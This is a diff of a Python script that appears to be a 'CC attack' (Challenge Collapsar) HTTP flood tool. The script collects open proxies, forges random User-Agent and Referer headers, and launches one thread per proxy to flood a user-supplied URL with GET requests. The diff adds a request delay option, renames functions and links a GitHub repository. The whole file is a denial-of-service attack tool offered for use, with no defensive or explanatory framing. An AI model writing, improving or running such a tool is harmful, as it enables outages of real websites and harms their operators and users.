@@ -1,11 +1,13 @@
 import requests     
 import re
+import os
 import random
 import threading 
 import time
 import datetime
 import sys
- 
+
+Choice=random.choice 
 referers = [
 	"https://www.google.com/search?q=",
 	"https://check-host.net/",
@@ -22,7 +24,7 @@ referers = [
 	"https://www.ted.com/search?q=",
 	"https://play.google.com/store/search?q=",
 ]
-def creat_header():
+def getuseragent():
     browser=random.choice(['chrome', 'firefox', 'ie'])
     os_list=[['68K', 'PPC', 'Intel Mac OS X'],\
              ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'],\
@@ -52,7 +54,7 @@ def block(size,out_str = ''):
 def cc(): 
     global pro_count
     headers = {
-        'User-Agent':str(creat_header),
+        'User-Agent':str(getuseragent),
         'Connection':'Keep-Alive',
         'Cache-Control':'no-cache',
         'Referer':random.choice(referers) + block(size=random.randint(5,10)),
@@ -62,9 +64,9 @@ def cc():
         }
     try:
         requests.get(url = url,headers=headers,proxies=proxies_list[pro_count],timeout=10)
-        sys.stdout.write("Thread<"+str(pro_count)+">\r")
+        sys.stdout.write("[*] Thread<"+str(pro_count)+">\r")
     except Exception as e:
-        print(f"[info]Error>{e}")
+        print(f"[*]Error>{e}")
 
  
 
@@ -76,7 +78,8 @@ def get_html(url):
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
         "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
         "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
-        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
+        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15"
+
         ]
     headers = {'User-Agent':random.choice(user_agent_list)}
     response = requests.get(url=url, headers=headers)
@@ -94,12 +97,13 @@ def get_proxies():
         host=parse_data(get_html(url))
         for i in range(0,len(host)-1):
             proxies_list.append({"HTTP":"http://%s/"%host[i],"HTTPS":"https://%s/"%host[i]})
-    print("[Info]>Get %s proxies"%len(proxies_list))
+    print("[*]>Get %s proxies"%len(proxies_list))
     return (proxies_list)
 
-def run():
+def st():
     global pro_count
     for pro_count in range(0,count-1):
+        time.sleep(delay/1000)
         threading.Thread(target=cc).start()
 
 if __name__ == "__main__": 
@@ -109,15 +113,16 @@ if __name__ == "__main__":
  / /   / /      / /| |/ __/ __/ __ `/ ___/ __/
 / /___/ /___   / ___ / /_/ /_/ /_/ / /__/ /_
 \____/\____/  /_/  |_\__/\__/\__,_/\___/\__/
+
+github:https://github.com/None20/Challenge-Collapsar
 """)
-    url=input("URL:")
-    print("[Info]>Ready to setup")
+    url=input("> URL:")
+    delay=input("> Delay(default=0 ms):")
+    delay=[int(delay) if delay!='' else 0][0]
+    print("[*]>Ready to setup")
     proxies_list=get_proxies()
-    print("[Info]>Setup completed")
+    print("[*]>Setup completed")
     count=len(proxies_list)
-    print("[Info]>Start attack")
+    print("[*]>Start attact")
     for i in range(2):
-        threading.Thread(target=run).start()
-        
-
-
+        threading.Thread(target=st).start()
